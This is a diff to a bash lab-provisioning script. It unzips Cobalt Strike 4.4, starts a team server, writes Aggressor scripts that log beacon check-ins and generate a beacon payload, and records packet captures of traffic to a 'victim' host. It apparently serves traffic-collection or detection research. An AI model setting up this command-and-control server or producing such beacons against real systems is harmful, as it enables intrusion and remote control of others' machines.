@@ -1,13 +1,14 @@
 #!/bin/bash
 
-unzip /vagrant/Cobaltstrike-4.4.zip
-cd CSAgent
+rm -rf Cobaltstrike-4.4
+unzip /vagrant/cobaltstrike-4.4.zip
+cd Cobaltstrike-4.4
 chmod 755 teamserver agscript
 
-tmux new-session -d -s collector -n teamserver 'sudo ./teamserver $ts_host $ts_password'
 echo "Team server starting ..."
-
-sleep 20  # wait for teamserver starting
+tmux new-session -d -s collector -n teamserver 'sudo ./teamserver $ts_host $ts_password'
+sleep 20  # wait for team server starting
+nc -zv localhost 50050
 
 cat << EOF > /tmp/listener.cna
 on ready {
@@ -16,19 +17,19 @@ on ready {
 }
 
 on beacon_initial {
-  println("[Initial]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . $1 . "\n");
+  println("[Initial]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . "\n");
 }
 
 on beacon_checkin {
-  println("[Checkin]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon ". $1 . ", MSG: " . $2 . "\n");
+  println("[Checkin]" . formatDate("HH:mm:ss z") . " Beacon ". \$1 . ", MSG: " . \$2 . "\n");
 }
 
 on beacon_input {
-  println("[Input]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . $1 . ", MSG: " . $2 . ", RESP: " . $3 . "\n");
+  println("[Input]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . ", MSG: " . \$2 . ", RESP: " . \$3 . "\n");
 }
 
 on beacon_output {
-  println("[Output]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . $1 . ", MSG: " . $2 . "\n");
+  println("[Output]" . formatDate("HH:mm:ss z") . " Beacon " . \$1 . ", MSG: " . \$2 . "\n");
 }
 
 # on * {
@@ -36,11 +37,17 @@ on beacon_output {
 # }
 EOF
 
-# tmux new-window -t collector -n listener './agscript $ts_host 50050 neo $ts_password /tmp/listener.cna &> /tmp/listener.log'
-tmux new-window -t collector -n listener './agscript $ts_host 50050 neo $ts_password /tmp/listener.cna'
 echo "Listener starting ..."
+nohup ./agscript $ts_host 50050 monlis $ts_password /tmp/listener.cna &> /tmp/listener.log &
+sleep 10
+cat /tmp/listener.log
+echo -n "agscript PID: "
+pgrep agscript
 
-sleep 10  # wait for listener starting
+nohup tshark -i $server_nic -f "tcp and host $victim_host" -c $packet_cnt -w /vagrant/data/$pcap_file_name &> /tmp/tshark.log &
+sleep 5
+echo -n "tshark PID: "
+pgrep tshark
 
 cat << 'EOF' > /tmp/beacon.cna
 on ready {
@@ -50,14 +57,13 @@ on ready {
   $$handle = openf(">/vagrant/data/$beacon_file");
   writeb($$handle, $$data);
   closef($$handle);
-  println(formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . "$beacon_file" . " created successfully!")
+  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . "$beacon_file" . " created successfully!")
   closeClient();
 }
 EOF
 
 echo "Generating beacon ..."
-tmux new-window -t collector -n beacon './agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna'
+./agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna &> /tmp/beacon.log
+sleep 5
+cat /tmp/beacon.log
 
-tmux new-window -t collector -n tshark 'tshark -i $server_nic -f "tcp and host $victim_host" -c $packet_cnt -w /vagrant/data/$pcap_file_name'
-
-tmux ls
